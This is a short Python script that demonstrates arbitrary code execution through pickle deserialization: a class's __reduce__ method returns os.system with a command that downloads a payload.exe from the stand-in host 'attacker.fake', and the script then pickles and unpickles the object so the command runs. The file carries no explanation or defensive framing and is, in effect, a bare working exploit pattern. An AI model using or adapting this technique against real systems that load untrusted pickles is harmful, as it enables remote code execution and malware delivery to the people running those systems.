import pickle
import os


class Fake:
    def __reduce__(self):
        cmd = ('wget https://attacker.fake/payload.exe')
        return os.system, (cmd,)
      
pickled = pickle.dumps(Fake())
pickle.loads(pickled)